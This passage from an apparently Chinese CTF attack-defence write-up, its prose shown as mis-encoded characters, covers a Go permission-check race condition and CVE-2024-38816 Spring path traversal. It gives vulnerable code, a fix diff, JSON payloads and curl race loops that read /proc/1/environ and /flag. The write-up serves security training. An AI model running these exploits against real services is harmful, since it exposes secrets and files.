                Success<span class="token punctuation">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>
                Data<span class="token punctuation">:</span>    <span class="token keyword">map</span><span class="token punctuation">[</span><span class="token builtin">string</span><span class="token punctuation">]</span><span class="token builtin">string</span><span class="token punctuation">{</span><span class="token string">"error"</span><span class="token punctuation">:</span> err<span class="token punctuation">.</span><span class="token function">Error</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">,</span>
            <span class="token punctuation">}</span>
            c<span class="token punctuation">.</span><span class="token function">JSON</span><span class="token punctuation">(</span><span class="token number">400</span><span class="token punctuation">,</span> response<span class="token punctuation">)</span>

        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
            response <span class="token operator">=</span> ResTemplate<span class="token punctuation">{</span>
                Success<span class="token punctuation">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>
                Data<span class="token punctuation">:</span>    <span class="token keyword">map</span><span class="token punctuation">[</span><span class="token builtin">string</span><span class="token punctuation">]</span><span class="token builtin">string</span><span class="token punctuation">{</span><span class="token string">"result"</span><span class="token punctuation">:</span> result<span class="token punctuation">}</span><span class="token punctuation">,</span>
            <span class="token punctuation">}</span>
            <span class="token function">initRBAC</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
            c<span class="token punctuation">.</span><span class="token function">JSON</span><span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">,</span> response<span class="token punctuation">)</span>
        <span class="token punctuation">}</span>

    <span class="token punctuation">}</span><span class="token punctuation">)</span>
    r<span class="token punctuation">.</span><span class="token function">Run</span><span class="token punctuation">(</span><span class="token string">":80"</span><span class="token punctuation">)</span>
<span class="token punctuation">}</span>

<span class="token keyword">func</span> <span class="token function">initRBAC</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    RBACList <span class="token operator">=</span> <span class="token function">make</span><span class="token punctuation">(</span><span class="token keyword">map</span><span class="token punctuation">[</span><span class="token builtin">string</span><span class="token punctuation">]</span><span class="token builtin">int</span><span class="token punctuation">)</span>
    RBACList<span class="token punctuation">[</span><span class="token string">"file:read"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span>
    RBACList<span class="token punctuation">[</span><span class="token string">"file:return"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span>
    RBACList<span class="token punctuation">[</span><span class="token string">"flag:read"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span>
    RBACList<span class="token punctuation">[</span><span class="token string">"flag:return"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span>
    RBACList<span class="token punctuation">[</span><span class="token string">"pwd:read"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span>
    RBACList<span class="token punctuation">[</span><span class="token string">"directory:read"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span>
    RBACList<span class="token punctuation">[</span><span class="token string">"directory:return"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span>
    RBACList<span class="token punctuation">[</span><span class="token string">"rbac:read"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span>
    RBACList<span class="token punctuation">[</span><span class="token string">"rbac:change_read"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span>
    RBACList<span class="token punctuation">[</span><span class="token string">"rbac:change_return"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span>

<span class="token punctuation">}</span>

<span class="token keyword">func</span> <span class="token function">updateRBAC</span><span class="token punctuation">(</span>RBACToGrant <span class="token keyword">map</span><span class="token punctuation">[</span><span class="token builtin">string</span><span class="token punctuation">]</span><span class="token builtin">int</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">for</span> key<span class="token punctuation">,</span> value <span class="token operator">:=</span> <span class="token keyword">range</span> RBACToGrant <span class="token punctuation">{</span>
        <span class="token keyword">if</span> strings<span class="token punctuation">.</span><span class="token function">HasSuffix</span><span class="token punctuation">(</span>key<span class="token punctuation">,</span> <span class="token string">":read"</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">if</span> RBACList<span class="token punctuation">[</span><span class="token string">"rbac:change_read"</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">1</span> <span class="token punctuation">{</span>
                RBACList<span class="token punctuation">[</span>key<span class="token punctuation">]</span> <span class="token operator">=</span> value
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> strings<span class="token punctuation">.</span><span class="token function">HasSuffix</span><span class="token punctuation">(</span>key<span class="token punctuation">,</span> <span class="token string">":return"</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">if</span> RBACList<span class="token punctuation">[</span><span class="token string">"rbac:change_return"</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">1</span> <span class="token punctuation">{</span>
                RBACList<span class="token punctuation">[</span>key<span class="token punctuation">]</span> <span class="token operator">=</span> value
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> key <span class="token operator">==</span> <span class="token string">"rbac:change_return:1"</span> <span class="token punctuation">{</span>
            RBACList<span class="token punctuation">[</span><span class="token string">"rbac:change_return"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span>

        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> key <span class="token operator">==</span> <span class="token string">"rbac:change_return:0"</span> <span class="token punctuation">{</span>
            RBACList<span class="token punctuation">[</span><span class="token string">"rbac:change_return"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span>

        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
            RBACList<span class="token punctuation">[</span>key<span class="token punctuation">]</span> <span class="token operator">=</span> value
        <span class="token punctuation">}</span>

    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token keyword">func</span> <span class="token function">execCommand</span><span class="token punctuation">(</span>funcName <span class="token builtin">string</span><span class="token punctuation">,</span> param <span class="token builtin">string</span><span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token builtin">string</span><span class="token punctuation">,</span> <span class="token builtin">error</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>

    <span class="token keyword">if</span> funcName <span class="token operator">==</span> <span class="token string">"getPwd"</span> <span class="token punctuation">{</span>
        <span class="token keyword">if</span> RBACList<span class="token punctuation">[</span><span class="token string">"pwd:read"</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">1</span> <span class="token punctuation">{</span>
            pwd<span class="token punctuation">,</span> err <span class="token operator">:=</span> os<span class="token punctuation">.</span><span class="token function">Getwd</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
            <span class="token keyword">return</span> pwd<span class="token punctuation">,</span> err

        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
            <span class="token keyword">return</span> <span class="token string">"No Permission"</span><span class="token punctuation">,</span> <span class="token boolean">nil</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> funcName <span class="token operator">==</span> <span class="token string">"getDirectory"</span> <span class="token punctuation">{</span>
        <span class="token comment">// read directory</span>
        <span class="token keyword">if</span> RBACList<span class="token punctuation">[</span><span class="token string">"directory:read"</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">1</span> <span class="token punctuation">{</span>
            <span class="token keyword">var</span> fileNames <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token builtin">string</span>
            err <span class="token operator">:=</span> filepath<span class="token punctuation">.</span><span class="token function">Walk</span><span class="token punctuation">(</span>param<span class="token punctuation">,</span> <span class="token keyword">func</span><span class="token punctuation">(</span>path <span class="token builtin">string</span><span class="token punctuation">,</span> info os<span class="token punctuation">.</span>FileInfo<span class="token punctuation">,</span> err <span class="token builtin">error</span><span class="token punctuation">)</span> <span class="token builtin">error</span> <span class="token punctuation">{</span>
                fileNames <span class="token operator">=</span> <span class="token function">append</span><span class="token punctuation">(</span>fileNames<span class="token punctuation">,</span> info<span class="token punctuation">.</span><span class="token function">Name</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
                <span class="token keyword">return</span> <span class="token boolean">nil</span>
            <span class="token punctuation">}</span><span class="token punctuation">)</span>
            <span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">{</span>
                <span class="token keyword">return</span> <span class="token string">"error"</span><span class="token punctuation">,</span> err
            <span class="token punctuation">}</span>
            directoryFiles <span class="token operator">:=</span> strings<span class="token punctuation">.</span><span class="token function">Join</span><span class="token punctuation">(</span>fileNames<span class="token punctuation">,</span> <span class="token string">" "</span><span class="token punctuation">)</span>
            <span class="token keyword">if</span> RBACList<span class="token punctuation">[</span><span class="token string">"directory:return"</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">1</span> <span class="token punctuation">{</span>
                <span class="token keyword">return</span> directoryFiles<span class="token punctuation">,</span> <span class="token boolean">nil</span>
            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
                <span class="token keyword">return</span> <span class="token string">"the directory "</span> <span class="token operator">+</span> param <span class="token operator">+</span> <span class="token string">" exists"</span><span class="token punctuation">,</span> <span class="token boolean">nil</span>
            <span class="token punctuation">}</span>

        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
            <span class="token keyword">return</span> <span class="token string">"No Permission"</span><span class="token punctuation">,</span> <span class="token boolean">nil</span>
        <span class="token punctuation">}</span>

    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> funcName <span class="token operator">==</span> <span class="token string">"getFile"</span> <span class="token punctuation">{</span>
        <span class="token comment">// read file</span>
        <span class="token keyword">if</span> RBACList<span class="token punctuation">[</span><span class="token string">"file:read"</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">1</span> <span class="token punctuation">{</span>
            <span class="token keyword">if</span> strings<span class="token punctuation">.</span><span class="token function">Contains</span><span class="token punctuation">(</span>param<span class="token punctuation">,</span> <span class="token string">"flag"</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token keyword">if</span> RBACList<span class="token punctuation">[</span><span class="token string">"flag:read"</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">1</span> <span class="token punctuation">{</span>
                    <span class="token keyword">return</span> <span class="token string">"No Permission"</span><span class="token punctuation">,</span> <span class="token boolean">nil</span>
                <span class="token punctuation">}</span>

            <span class="token punctuation">}</span>
            data<span class="token punctuation">,</span> err <span class="token operator">:=</span> os<span class="token punctuation">.</span><span class="token function">ReadFile</span><span class="token punctuation">(</span>param<span class="token punctuation">)</span>
            <span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">{</span>
                <span class="token keyword">return</span> <span class="token string">"file:"</span><span class="token operator">+</span>param<span class="token operator">+</span><span class="token string">" doesn't exist"</span><span class="token punctuation">,</span> <span class="token boolean">nil</span>
            <span class="token punctuation">}</span>
            content <span class="token operator">:=</span> <span class="token function">string</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span>
            <span class="token keyword">if</span> RBACList<span class="token punctuation">[</span><span class="token string">"file:return"</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">0</span> <span class="token punctuation">{</span>
                <span class="token keyword">return</span> <span class="token string">"the file "</span> <span class="token operator">+</span> param <span class="token operator">+</span> <span class="token string">" exists"</span><span class="token punctuation">,</span> <span class="token boolean">nil</span>
            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> RBACList<span class="token punctuation">[</span><span class="token string">"file:return"</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">1</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span>strings<span class="token punctuation">.</span><span class="token function">Contains</span><span class="token punctuation">(</span>param<span class="token punctuation">,</span> <span class="token string">"flag"</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token keyword">return</span> content<span class="token punctuation">,</span> <span class="token boolean">nil</span>
            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> RBACList<span class="token punctuation">[</span><span class="token string">"file:return"</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">1</span> <span class="token operator">&amp;&amp;</span> strings<span class="token punctuation">.</span><span class="token function">Contains</span><span class="token punctuation">(</span>param<span class="token punctuation">,</span> <span class="token string">"flag"</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> RBACList<span class="token punctuation">[</span><span class="token string">"flag:return"</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">1</span> <span class="token punctuation">{</span>
                <span class="token keyword">return</span> content<span class="token punctuation">,</span> <span class="token boolean">nil</span>
            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
                <span class="token keyword">return</span> <span class="token string">"the file "</span> <span class="token operator">+</span> param <span class="token operator">+</span> <span class="token string">" exists"</span><span class="token punctuation">,</span> <span class="token boolean">nil</span>
            <span class="token punctuation">}</span>

        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
            <span class="token keyword">return</span> <span class="token string">"No Permission"</span><span class="token punctuation">,</span> <span class="token boolean">nil</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
        <span class="token keyword">return</span> <span class="token string">"No such func"</span><span class="token punctuation">,</span> errors<span class="token punctuation">.</span><span class="token function">New</span><span class="token punctuation">(</span><span class="token string">"No such func"</span><span class="token punctuation">)</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre>

<p>é¢˜ç›®ä¸­çš„å„å‡½æ•°ä¸»è¦ç»´æŠ¤ä¸€ä¸ªç”¨äºæƒé™æ§åˆ¶çš„ RBACListï¼Œ<span class="hexo-wm">ğ˜´â€‹3ğ˜·eğ’Â·â€â€êœ±ï½‰â€â€‹ğ’•eï»¿</span>ä½†æ²¡æœ‰å¯¹è¯¥ List è®¾ç½®äº’æ–¥é”ï¼Œå¯¼è‡´å­˜åœ¨ç«æ€æ¡ä»¶</p>
<blockquote>
<p>å‡ºé¢˜äººå¥½åƒå‡ºé”…äº†ï¼Œ<span class="hexo-wm">ğ’”â€‹â€3ğ¯â„¯ğ§ï¼â€Œï»¿ğ¬ğ˜ªï»¿ğ’•ğ˜¦â€â€</span>è¿™ä¸ªé¢˜ç›®æœ¬èº«çš„åŠŸèƒ½å®ç°å’Œæ§åˆ¶æµéƒ½æ˜¯é”™è¯¯çš„ï¼Œç”±äº <span class="hexo-wm">ğ˜´â€‹â‘¶veï½.â€Œêœ±ï½‰â€Œâ€‹ğ’•ğâ€‹â€‹</span>Go çš„ map æ˜¯ä¸€ä¸ªå“ˆå¸Œè¡¨ï¼Œ<code>updateRBAC(RBACToGrant map[string]int)</code> ä¸­å¯¹ RBACToGrant çš„éå†å¹¶ä¸æ˜¯æŒ‰ç…§æ·»åŠ çš„é¡ºåºï¼Œå…¶éå†é¡ºåºæ˜¯æ— åºä¸”éšæœºåŒ–çš„ï¼Œå› æ­¤å®Œå…¨ä¸èƒ½å®ç°é¢„æœŸåŠŸèƒ½ï¼Œä¹Ÿå°±å¯¼è‡´æœ¬é¢˜å¯ä»¥è¢«éé¢„æœŸ</p>
</blockquote>
<h4 id="Fix-1"><a href="#Fix-1" class="headerlink" title="Fix"></a>Fix</h4><p>ç›´æ¥åˆ é™¤è¯» flag <span class="hexo-wm">ğ˜€ï»¿â€‹ğŸ¯â…´â„¯ï½â€¢â€‹â€‹êœ±ï½‰ï»¿â€‹ğ˜µï½…â€â€‹</span>çš„é€»è¾‘çš„ä»£ç å³å¯ï¼š</p>
<pre class="language-go" data-language="go"><code class="language-go"><span class="token number">241</span>	  <span class="token keyword">if</span> RBACList<span class="token punctuation">[</span><span class="token string">"file:return"</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">0</span> <span class="token punctuation">{</span>
<span class="token number">242</span>	      <span class="token keyword">return</span> <span class="token string">"the file "</span> <span class="token operator">+</span> param <span class="token operator">+</span> <span class="token string">" exists"</span><span class="token punctuation">,</span> <span class="token boolean">nil</span>
<span class="token number">243</span>	  <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> RBACList<span class="token punctuation">[</span><span class="token string">"file:return"</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">1</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span>strings<span class="token punctuation">.</span><span class="token function">Contains</span><span class="token punctuation">(</span>param<span class="token punctuation">,</span> <span class="token string">"flag"</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
<span class="token number">244</span>	      <span class="token keyword">return</span> content<span class="token punctuation">,</span> <span class="token boolean">nil</span>
<span class="token number">245</span>	<span class="token operator">-</span> <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> RBACList<span class="token punctuation">[</span><span class="token string">"file:return"</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">1</span> <span class="token operator">&amp;&amp;</span> strings<span class="token punctuation">.</span><span class="token function">Contains</span><span class="token punctuation">(</span>param<span class="token punctuation">,</span> <span class="token string">"flag"</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> RBACList<span class="token punctuation">[</span><span class="token string">"flag:return"</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">1</span> <span class="token punctuation">{</span>
<span class="token number">246</span>	<span class="token operator">-</span>     <span class="token keyword">return</span> content<span class="token punctuation">,</span> <span class="token boolean">nil</span>
<span class="token number">247</span>	  <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
<span class="token number">248</span>       <span class="token keyword">return</span> <span class="token string">"the file "</span> <span class="token operator">+</span> param <span class="token operator">+</span> <span class="token string">" exists"</span><span class="token punctuation">,</span> <span class="token boolean">nil</span>
<span class="token number">249</span>	  <span class="token punctuation">}</span></code></pre>

<h4 id="Break"><a href="#Break" class="headerlink" title="Break"></a>Break</h4><h5 id="éé¢„æœŸæ‰“æ³•"><a href="#éé¢„æœŸæ‰“æ³•" class="headerlink" title="éé¢„æœŸæ‰“æ³•"></a>éé¢„æœŸæ‰“æ³•</h5><p>ç›´æ¥æŒ‰ç…§æ­£å¸¸é¡ºåºè¯»ä¸€ä¸ªä¸å­˜åœ¨çš„ç›®å½•æˆ–è€…æŒç»­è¾“å‡ºçš„ç›®å½•é¿å…è¿›å…¥ <span class="hexo-wm">ğ¬â€Œâ€ğŸ¯ğ˜·ğğ’â€¢â€‹ğ¬iâ€Œğ­ï½…â€Œ</span>initRBAC å¯¼è‡´é‡ç½®</p>
<pre class="language-json" data-language="json"><code class="language-json"><span class="token punctuation">{</span>
  <span class="token property">"File"</span><span class="token operator">:</span><span class="token punctuation">[</span>
    <span class="token string">"read"</span><span class="token punctuation">,</span>
    <span class="token string">"return"</span>
  <span class="token punctuation">]</span><span class="token punctuation">,</span>
  <span class="token property">"Directory"</span><span class="token operator">:</span><span class="token punctuation">[</span>
    <span class="token string">"read"</span><span class="token punctuation">,</span>
    <span class="token string">"return"</span>
  <span class="token punctuation">]</span><span class="token punctuation">,</span>
  <span class="token property">"Pwd"</span><span class="token operator">:</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
  <span class="token property">"Flag"</span><span class="token operator">:</span><span class="token punctuation">[</span>
    <span class="token string">"read"</span>
  <span class="token punctuation">]</span><span class="token punctuation">,</span>
  <span class="token property">"FuncName"</span><span class="token operator">:</span><span class="token string">"getDirectory"</span><span class="token punctuation">,</span>
  <span class="token property">"Param"</span><span class="token operator">:</span><span class="token string">"/tmp/zxx"</span>
<span class="token punctuation">}</span></code></pre>
<p>å‡è®¾è¿™é‡ŒéšæœºåŒ–åˆ°äº†ä¸€ä¸ª <code>RBACList["rbac:change_return"] = 1</code> çš„ç»“æœï¼Œç„¶åç»™ <span class="hexo-wm">êœ±â€â€Œ3ğ’—ğnÂ·â€‹sğ¢â€â€‹ğ’•ï½…â€ï»¿</span>flag è®¾è¿”å›æƒé™ï¼š</p>
<pre class="language-json" data-language="json"><code class="language-json"><span class="token punctuation">{</span>
  <span class="token property">"File"</span><span class="token operator">:</span><span class="token punctuation">[</span>
    <span class="token string">"return"</span>
  <span class="token punctuation">]</span><span class="token punctuation">,</span>
  <span class="token property">"Directory"</span><span class="token operator">:</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
  <span class="token property">"Pwd"</span><span class="token operator">:</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
  <span class="token property">"Flag"</span><span class="token operator">:</span><span class="token punctuation">[</span>
    <span class="token string">"return"</span>
  <span class="token punctuation">]</span><span class="token punctuation">,</span>
  <span class="token property">"FuncName"</span><span class="token operator">:</span><span class="token string">"getDirectory"</span><span class="token punctuation">,</span>
  <span class="token property">"Param"</span><span class="token operator">:</span><span class="token string">"/tmp/zxx"</span>
<span class="token punctuation">}</span></code></pre>
<p>æœ€åè¯»å‡º flagï¼š</p>
<pre class="language-json" data-language="json"><code class="language-json"><span class="token punctuation">{</span>
  <span class="token property">"File"</span><span class="token operator">:</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
  <span class="token property">"Directory"</span><span class="token operator">:</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
  <span class="token property">"Pwd"</span><span class="token operator">:</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
  <span class="token property">"Flag"</span><span class="token operator">:</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
  <span class="token property">"FuncName"</span><span class="token operator">:</span><span class="token string">"getFile"</span><span class="token punctuation">,</span>
  <span class="token property">"Param"</span><span class="token operator">:</span><span class="token string">"/flag"</span>
<span class="token punctuation">}</span></code></pre>

<h5 id="é¢„æœŸæ‰“æ³•"><a href="#é¢„æœŸæ‰“æ³•" class="headerlink" title="é¢„æœŸæ‰“æ³•"></a>é¢„æœŸæ‰“æ³•</h5><blockquote>
<p>å‡è®¾è¯¥é¢˜çš„åŠŸèƒ½å®<span class="hexo-wm">êœ±â€â‘¶ğ’—â„®ï½Â·ï»¿ï»¿êœ±ğ˜ªï»¿ï½”ğ˜¦â€‹â€Œ</span>ç°æ˜¯æ­£ç¡®çš„ï¼Œ<code>updateRBAC(RBACToGrant map[string]int)</code> ä¸­æŒ‰ç…§æ·»åŠ çš„é¡ºåºå¯¹ <span class="hexo-wm">ğ˜€â€Œï»¿Â³ğ’—â„®nâ€¢â€Ñ•ğ¢â€Œğ’•ğ˜¦â€‹â€Œ</span>RBACToGrant è¿›è¡Œéå†</p>
</blockquote>
<p>ç”±äºè¿™é‡Œçš„ RBACList æ²¡æœ‰è®¾ç½®å…¨å±€äº’æ–¥é”ï¼Œå¯¼è‡´å­˜åœ¨ç«æ€æ¡ä»¶ï¼Œå½“æŸä¸€è¯·æ±‚çº¿ç¨‹è¿è¡Œåˆ°<code>RBACList["rbac:change_return"] = 1</code> è€Œå¦ä¸€çº¿ç¨‹è¿è¡Œåˆ° <code>if RBACList["rbac:change_return"] == 1 { RBACList[key] = value }</code> æ—¶å³å¯è®¾ç½® flag key çš„ <span class="hexo-wm">ğ˜´ï»¿â€ğŸ¯ğ’—â„¯nâ€¢â€‹sâ…ˆâ€‹â€Œğ’•ğâ€‹â€</span>return æƒé™ä»è€Œè¯»å‡º flag</p>
<p>ç›´æ¥è·‘ä¸¤ä¸ªè„šæœ¬ç«æ€ï¼š</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token keyword">while</span> <span class="token boolean">true</span><span class="token punctuation">;</span> <span class="token keyword">do</span> 
  <span class="token function">curl</span> <span class="token string">"http://xxxx/execSysFunc"</span> <span class="token parameter variable">--data</span> <span class="token string">'{"File":["read","return"], "Directory":[],"Pwd":[],"Flag":["read","return"],"FuncName":"getFile","Param":"/proc/1/environ"}'</span><span class="token punctuation">;</span>
<span class="token keyword">done</span></code></pre>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token keyword">while</span> <span class="token boolean">true</span><span class="token punctuation">;</span> <span class="token keyword">do</span> 
  <span class="token function">curl</span> <span class="token string">"http://xxxx/execSysFunc"</span> <span class="token parameter variable">--data</span> <span class="token string">'{"File":[],"Directory":[],"Pwd":[],"Flag":[],"FuncName":"getFile","Param":"/flag"}'</span><span class="token punctuation">;</span>
<span class="token keyword">done</span></code></pre>
<p>å…¶ä¸­ç¬¬ä¸€ä¸ªè„šæœ¬å¤šçº¿ç¨‹å¼‚æ­¥è·‘ï¼Œç”¨äºåˆ›é€  flag çš„ return <span class="hexo-wm">ğ˜€ï»¿ï»¿Â³veï½.â€ğ˜€ğ˜ªâ€‹ğ’•â„®â€‹â€Œ</span>æ¡ä»¶ï¼Œç¬¬äºŒä¸ªè„šæœ¬ç”¨äºè¯»å‡ºflag</p>
<h3 id="3-ota"><a href="#3-ota" class="headerlink" title="3. ota"></a>3. ota</h3><h4 id="é¢˜ç›®åˆ†æ-1"><a href="#é¢˜ç›®åˆ†æ-1" class="headerlink" title="é¢˜ç›®åˆ†æ"></a>é¢˜ç›®åˆ†æ</h4><h5 id="1-Spring-æ¡†æ¶ç›®å½•éå†æ¼æ´"><a href="#1-Spring-æ¡†æ¶ç›®å½•éå†æ¼æ´" class="headerlink" title="1. Spring æ¡†æ¶ç›®å½•éå†æ¼æ´"></a>1. Spring æ¡†æ¶ç›®å½•éå†æ¼æ´</h5><pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>properties</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>spring-boot.version</span><span class="token punctuation">&gt;</span></span>3.3.3<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>spring-boot.version</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>properties</span><span class="token punctuation">&gt;</span></span>

<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">&gt;</span></span>org.springframework.boot<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">&gt;</span></span>spring-boot-starter-undertow<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">&gt;</span></span>

<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">&gt;</span></span>org.springframework.boot<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">&gt;</span></span>spring-boot-starter-webflux<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">&gt;</span></span></code></pre>
<p>é¢˜ç›®ä½¿ç”¨ undertow + webflux æ¡†æ¶ï¼Œå…¶ä¸­ spring-<span class="hexo-wm">êœ±â€â‘¶vâ„®ğ˜¯ï¼â€Œâ€Ñ•â…ˆâ€â€‹teï»¿</span>boot version ä¸º 3.3.3ï¼Œå­˜åœ¨ CVE-2024-38816 Spring Framework ç›®å½•éå†æ¼æ´ï¼Œæ¼æ´ç‚¹å¦‚ä¸‹ï¼š</p>
<pre class="language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@Configuration</span>
<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">WebConfig</span> <span class="token punctuation">{</span>
  <span class="token annotation punctuation">@Bean</span>
  <span class="token keyword">public</span> <span class="token class-name">RouterFunction</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">ServerResponse</span><span class="token punctuation">&gt;</span></span> <span class="token function">route</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">return</span> 
      <span class="token class-name">RouterFunctions</span><span class="token punctuation">.</span><span class="token function">resources</span><span class="token punctuation">(</span><span class="token string">"/static/**"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token class-name">Resource</span><span class="token punctuation">)</span><span class="token keyword">new</span> <span class="token class-name">FileSystemResource</span><span class="token punctuation">(</span><span class="token string">"/opt/static/"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span></code></pre>
